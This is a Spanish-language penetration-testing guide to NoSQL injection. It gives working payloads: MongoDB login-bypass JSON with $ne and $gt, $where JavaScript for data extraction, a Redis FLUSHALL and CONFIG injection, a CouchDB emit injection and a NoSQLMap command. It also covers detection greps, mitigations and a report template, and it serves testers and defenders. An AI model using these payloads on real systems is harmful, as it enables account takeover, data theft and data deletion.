# NoSQL Injection (NoSQLi)

## Resumen

NoSQL Injection aprovecha la falta de validación de entrada en aplicaciones que usan bases de datos NoSQL (MongoDB, CouchDB, Redis, Cassandra) para manipular consultas, obtener datos no autorizados, modificar o eliminar registros. Aunque NoSQLi carece de SQL tradicional, los operadores y sintaxis de los motores NoSQL permiten patrones similares de inyección.

## Contexto

Motores comunes:

- **MongoDB:** JSON‐style queries (`db.users.find({ … })`)
- **CouchDB:** MapReduce con JavaScript
- **Redis:** comandos construidos dinámicamente
- **Cassandra:** CQL con parámetros en strings

Las aplicaciones web suelen construir consultas NoSQL concatenando input de usuario en objetos JSON o cadenas, p. ej.:

```javascript
// Node.js + MongoDB
const query = { username: req.body.user, password: req.body.pass };
db.collection('users').findOne(query, …);
```

## Metodología de Ataque

### 1. Identificación de Puntos de Inyección

- Endpoints de login/autenticación (`user`, `pass`).
- Filtros de búsqueda (`q=`, `filter=`).
- Parámetros en JSON para APIs (`{ "field": value }`).
- Campos de consulta en plantillas de servidor.

### 2. Pruebas Manuales

#### 2.1 MongoDB JSON Injection

- **Bypass de login:**
  Enviar `{ "user": { "$ne": null }, "pass": { "$ne": null } }` en JSON

```json
{ "user": { "$gt": "" }, "pass": { "$gt": "" } }
```

- **Exfiltración de datos:**
  Usar `$where` para ejecutar JavaScript en servidor:

```javascript
{ "$where": "this.password.length > 0" }
```

- **Proyección de campos:**
  Manipular objetos de consulta para retornar campos inesperados.

#### 2.2 Redis Command Injection

- Si la aplicación concatena input a un comando Redis:

```bash
SET session:{user_input} userdata
```

el atacante puede inyectar `; FLUSHALL` o `\r\nCONFIG GET *`.

#### 2.3 CouchDB JavaScript Injection

- MapReduce functions pueden incluir input sin sanitizar:

```javascript
function(doc) {
  if (doc.user == params.user) emit(doc._id, doc);
}
```

Inyectar `"; emit(1,1); //`.

## Pruebas Manuales

1. **Login Bypass:** JSON body

```http
POST /login HTTP/1.1
Content-Type: application/json

{"user":{"$ne":null},"pass":{"$ne":null}}
```

2. **Boolean Blind:**
   Cambiar valor para condicionar respuesta (200 vs 401).
3. **Error-Based:** Forzar error de ejecución JavaScript en `$where`.
4. **Out-of-Band:** `$where` que envíe HTTP a servidor atacante usando `require('http').get()`.

## Automatización

- **NoSQLMap**: escaneo y explotación automática para MongoDB y Redis.

```bash
nosqlmap -u "https://victim.com/login" --data '{"user": "FUZZ", "pass": "test"}' --method POST
```

- **Burp Suite**: usar Intruder con payloads JSON de operadores `$ne`, `$gt`, `$regex`, `$where`.

## Explotación / Impacto

- **Bypass de autenticación** y acceso a cuentas.
- **Extracción de colecciones completas** y datos sensibles.
- **Modificación o eliminación de datos** arbitrarios.
- **Ejecución remota de JavaScript** en servidor (MongoDB `$where`).
- **Pivot a otros servicios** internos (Redis ataques de flushall).

## Detección

```bash
# Logs que muestren operadores NoSQL
grep -E '\$ne|\$gt|\$where|\$regex' access.log
```

Monitor real‐time:

```bash
tail -f access.log | grep -E '\$'
```

## Mitigaciones

1. **Validación y saneamiento** de input: rechazar operadores (`$` prefix).
2. **Construir consultas con parámetros** sin concatenar JSON:

```javascript
db.users.findOne({ user: sanitize(user), pass: sanitize(pass) });
```

3. **Whitelisting de campos** permitidos en filtros y proyecciones.
4. **Deshabilitar `$where`** o JavaScript execution en queries.
5. **Principio de mínimos privilegios**: cuenta de DB con permisos restringidos.

## Reporte

**Título:** NoSQL Injection – Manipulación de Consultas JSON
**Resumen Ejecutivo:** El endpoint de login construye la consulta MongoDB a partir de input no validado, permitiendo bypass y extracción de datos mediante operadores como `$ne`, `$gt`.
**Pasos de Reproducción:**

1. Enviar JSON con `{ "user": { "$ne": null }, "pass": { "$ne": null } }`.
2. Confirmar login exitoso sin credenciales válidas.
3. Extraer colección: usar `{ "$where": "this.password.match(/.*/)" }`.
   **Mitigación Recomendada:** Validar input, rechazar operadores NoSQL, usar consultas parametrizadas y deshabilitar JavaScript queries.
